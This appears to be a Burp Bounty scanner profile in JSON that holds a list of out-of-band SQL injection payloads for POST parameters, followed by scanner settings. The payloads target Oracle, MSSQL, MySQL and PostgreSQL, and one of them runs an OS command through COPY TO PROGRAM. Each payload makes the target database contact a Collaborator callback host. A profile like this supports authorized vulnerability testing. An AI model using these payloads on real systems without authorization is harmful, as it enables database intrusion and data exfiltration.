[
  {
    "ProfileName": "SQLi_Collaborator_POSTParams",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "true,OR (SELECT LOAD_FILE(\u0027\\\\\\\\\u0027,\u0027{BC}\u0027))",
      "true,OR (SELECT UTL_HTTP.REQUEST(\u0027http://{BC}\u0027) FROM DUAL)",
      "true,OR (SELECT UTL_INADDR.get_host_addr((\u0027http://{BC}\u0027) FROM DUAL)",
      "true,OR (SELECT SYS.DBMS_LDAP.INIT(\u0027{BC}\u0027,80) FROM DUAL)",
      "true,OR (SELECT UTL_HTTP.REQUEST(\u0027http://{BC}\u0027) FROM DUAL)",
      "true,OR (SELECT UTL_INADDR.get_host_addr((\u0027http://{BC}\u0027) FROM DUAL)",
      "true,OR (SELECT SYS.DBMS_LDAP.INIT(\u0027{BC}\u0027,80) FROM DUAL)",
      "true,OR (declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;)--",
      "true,OR declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;--",
      "true,OR exec master..xp_dirtree \u0027//{BC}/a\u0027",
      "true,OR SELECT extractvalue(xmltype(\u0027\u003c?xml version\u003d\"1.0\" encoding\u003d\"UTF-8\"?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://{BC}/\"\u003e %remote;]\u003e\u0027),\u0027/l\u0027) FROM dual",
      "true,OR copy (SELECT \u0027\u0027) to program \u0027nslookup {BC}\u0027",
      "true,OR LOAD_FILE(\u0027\\\\\\\\{BC}\\\\a\u0027)",
      "true,OR SELECT ... INTO OUTFILE \u0027\\\\\\\\{BC}\\a\u0027",
      "true,;declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;--",
      "true,;(SELECT LOAD_FILE(\u0027\\\\\\\\\u0027,\u0027{BC}\u0027))",
      "true,;(SELECT UTL_HTTP.REQUEST(\u0027http://{BC}\u0027) FROM DUAL)",
      "true,;(SELECT UTL_INADDR.get_host_addr((\u0027http://{BC}\u0027) FROM DUAL)",
      "true,;(SELECT SYS.DBMS_LDAP.INIT(\u0027{BC}\u0027,80) FROM DUAL)",
      "true,;exec master..xp_dirtree \u0027//{BC}/a\u0027",
      "true,;SELECT extractvalue(xmltype(\u0027\u003c?xml version\u003d\"1.0\" encoding\u003d\"UTF-8\"?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://{BC}/\"\u003e %remote;]\u003e\u0027),\u0027/l\u0027) FROM dual",
      "true,;copy (SELECT \u0027\u0027) to program \u0027nslookup {BC}\u0027",
      "true,;LOAD_FILE(\u0027\\\\\\\\{BC}\\\\a\u0027)",
      "true,;SELECT ... INTO OUTFILE \u0027\\\\\\\\{BC}\\a\u0027",
      "true,and (SELECT LOAD_FILE(\u0027\\\\\\\\\u0027,\u0027{BC}\u0027))",
      "true,and (SELECT UTL_HTTP.REQUEST(\u0027http://{BC}\u0027) FROM DUAL)",
      "true,and (SELECT UTL_INADDR.get_host_addr((\u0027http://{BC}\u0027) FROM DUAL)",
      "true,and (SELECT SYS.DBMS_LDAP.INIT(\u0027{BC}\u0027,80) FROM DUAL)",
      "true,and (declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;)--",
      "true,and declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;--",
      "true,and exec master..xp_dirtree \u0027//{BC}/a\u0027",
      "true,and SELECT extractvalue(xmltype(\u0027\u003c?xml version\u003d\"1.0\" encoding\u003d\"UTF-8\"?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://{BC}/\"\u003e %remote;]\u003e\u0027),\u0027/l\u0027) FROM dual",
      "true,and copy (SELECT \u0027\u0027) to program \u0027nslookup {BC}\u0027",
      "true,and LOAD_FILE(\u0027\\\\\\\\{BC}\\\\a\u0027)",
      "true,and SELECT ... INTO OUTFILE \u0027\\\\\\\\{BC}\\a\u0027"
    ],
    "Encoder": [],
    "UrlEncode": true,
    "CharsToUrlEncode": "\u0026#",
    "Grep": [],
    "Tags": [
      "All",
      "SQLi",
      "SQLi POST Parameters",
      "All POST Parameters"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 5,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "SQLi_Collaborator_POSTParams",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "\n\n\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      1
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]